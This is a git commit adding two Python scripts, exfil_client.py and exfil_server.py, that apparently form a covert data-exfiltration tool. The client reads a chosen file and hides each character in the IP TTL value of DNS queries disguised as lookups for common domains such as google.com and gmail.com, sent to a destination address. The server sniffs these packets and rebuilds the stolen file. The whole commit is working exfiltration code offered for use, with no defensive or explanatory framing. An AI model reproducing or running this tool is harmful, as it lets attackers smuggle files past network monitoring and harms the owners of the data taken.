92e0f64d1fd2592cc81093e1ad800af63f931226
kohbgk <120411425+kohbgk@users.noreply.github.com>
2024-11-03 21:47:16 +0800

    Add files via upload

---
+++ exfil_client.py
@@ -0,0 +1,47 @@
+import sys
+from scapy.all import send, IP, UDP, DNS, DNSQR
+
+BASE_TTL = 64
+DEST_IP = "0.0.0.0"
+SYNC_DOMAIN = "www.google.com"
+DATA_DOMAIN = "www.gmail.com"
+END_DOMAIN = "www.yahoo.com"
+
+if len(sys.argv) != 2:
+    print("Usage: exfil_client.py <FILE NAME>")
+    sys.exit(1)
+
+
+def ord_data(file_name):
+    """Convert each character in the file and saves it as a list"""
+    ord_list = []
+    with open(file_name) as f:
+        data = f.read()
+    for char in data:
+        ord_list.append(ord(char))
+    return ord_list
+
+
+def send_data(file_name, ord_list):
+    """Sends SYNC, FILE, DATA and END packets"""
+    # Send Sync packet
+    send(IP(dst=DEST_IP,ttl=BASE_TTL)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.com")),verbose=0)
+    # Semd File packet
+    for char in file_name:
+        send(IP(dst=DEST_IP,ttl=BASE_TTL+ord(char))/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.facebook.com")),verbose=0)
+    # Send Data packet
+    for num in ord_list:
+        send(IP(dst=DEST_IP,ttl=BASE_TTL+num)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.gmail.com")),verbose=0)
+    # Send End packet
+    send(IP(dst=DEST_IP,ttl=BASE_TTL)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.yahoo.com")),verbose=0)
+
+
+def main():
+    file_name = sys.argv[1]
+    ord_list = ord_data(file_name)
+    send_data(file_name, ord_list)
+    print(f"File sent: {file_name}")
+
+
+if __name__ == "__main__":
+    main()
---
+++ exfil_server.py
@@ -0,0 +1,58 @@
+from scapy.all import DNS, IP, sniff
+import datetime
+
+BASE_TTL = 64
+SYNC_DOMAIN = "www.google.com"
+FILE_DOMAIN = "www.facebook.com"
+DATA_DOMAIN = "www.gmail.com"
+END_DOMAIN = "www.yahoo.com"
+new_ttl = None
+file_name = ""
+data = ""
+
+
+def save_file(file_name, data):
+    """Saves 'data' into '[TIME] file'"""
+    now = datetime.datetime.now()
+    formatted_date = now.strftime("%d%m%Y_%H%M%S")
+    with open(f"[{formatted_date}] {file_name}", 'w') as f:
+        f.write(data)
+    print(f"File saved as: [{formatted_date}] {file_name}")
+
+
+def packet_filter(pkt):
+    """Checks for SYNC, file, and DATA packets"""
+    global new_ttl
+    global file_name
+    global data
+
+    if not pkt.haslayer(DNS):
+        return
+
+    if pkt[DNS].qd.qname.decode()[:-1] == SYNC_DOMAIN:
+        new_ttl = pkt[IP].ttl # Define the new TTL
+    if pkt[DNS].qd.qname.decode()[:-1] == FILE_DOMAIN:
+        char = chr(pkt[IP].ttl - new_ttl) # Extract file name
+        file_name += char
+    if pkt[DNS].qd.qname.decode()[:-1] == DATA_DOMAIN:
+        char = chr(pkt[IP].ttl - new_ttl) # Extract data
+        data += char
+
+
+def stop_filter(pkt):
+    """Checks for END domain"""
+    if not pkt.haslayer(DNS):
+        return
+
+    if pkt[DNS].qd.qname.decode()[:-1] == END_DOMAIN:
+        print(f"File received: {file_name}")
+        save_file(file_name, data)
+        return True
+
+
+def main():
+    sniff(prn=packet_filter, stop_filter=stop_filter)
+
+
+if __name__ == "__main__":
+    main()
